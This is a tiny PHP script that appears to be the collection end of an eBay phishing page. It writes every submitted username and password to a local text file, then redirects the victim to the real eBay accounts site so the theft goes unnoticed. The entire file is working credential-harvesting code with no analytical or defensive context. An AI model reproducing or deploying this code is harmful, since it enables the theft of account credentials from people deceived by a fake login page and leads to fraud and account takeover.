<?php

    file_put_contents("usernames.txt", "Account: " . $_POST['userid'] . "\nPass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
